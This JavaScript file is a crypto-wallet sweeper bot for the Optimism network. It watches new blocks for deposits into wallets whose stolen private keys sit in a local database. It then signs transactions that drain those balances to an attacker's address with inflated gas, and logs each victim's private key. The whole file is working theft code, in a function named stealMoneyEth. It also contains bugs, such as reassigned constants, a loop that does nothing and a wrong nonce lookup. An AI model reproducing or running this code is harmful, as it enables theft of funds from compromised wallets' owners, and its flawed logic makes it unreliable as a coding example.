import Web3 from "web3";
import * as fs from 'fs';
import * as path from 'path';
import { rpc, grab, mainAddress } from "./config.js";

let web3 = null
let data = null

export async function runOpt() {
    web3 = new Web3(new Web3.providers.WebsocketProvider(rpc.OPT));
    data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
    await getBlocksEth();
}

async function getBlocksEth() {
    const subscription = await web3.eth.subscribe('newBlockHeaders');
    subscription.on('data', async (block, error) => {
        const lastBlock = await web3.eth.getBlock(block.number, true);
        const ethTransactions = lastBlock?.transactions;
        console.log(`Block ${lastBlock.number} | OPTIMISM`);
        try {
            for (let transaction of ethTransactions) {
                transactionWalletEth(transaction);
            }
        } catch (e) {
            console.log(e);
        }
    });
}

function transactionWalletEth(transaction) {
    const address = transaction.to;
    if (data[address]) {
        stealMoneyEth(address);
    }
}

async function stealMoneyEth(address) {
    const walletKey = data[address];
    const grabFromEthBalance = web3.utils.toWei(grab.OPT, 'ether');
    const balance = await web3.eth.getBalance(address);
    const gasPrice = await web3.eth.getGasPrice();

    const gasUnits = await web3.eth.estimateGas({
        "from": address,
        "to": web3.utils.toChecksumAddress(mainAddress),
        "value": balance,
    });
    const transactionCost = 0;
    const average = ((Math.random() * (2.6 - 2.3) + 2.3) + (Math.random() * (3 - 2.7) + 2.7)) / 2;

    gasPrice =  Math.trunc(gasPrice * average);
    transactionCost = gasUnits * gasPrice;

    for (let i = 0; i < 200; i++) {
        if (balance > grabFromEthBalance) {
            break;
        }
    }

    const amount = balance - transactionCost;
    const sendAddress = web3.utils.toChecksumAddress(mainAddress);
    const nonce = await web3.eth.getBlockTransactionCount(address);

    if (amount <= 0) {
        return;
    }

    const txPrice = {
        "chainId": 10,
        "nonce": nonce,
        "to": sendAddress,
        "value": amount,
        "gas": gasUnits,
        "maxFeePerGas": gasPrice,
        "maxPriorityFeePerGas": gasPrice,
        "type": 2,
    };
    const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
    const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const receipt = await web3.eth.getTransactionReceipt(txHash);
    const amountEther = web3.utils.fromWei(amount, 'ether');
    console.log(`✅ OPTIMISM | Success withdrawal \nHASH: ${receipt.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://optimistic.etherscan.io/address/${address} \nPK: ${walletKey}`);
}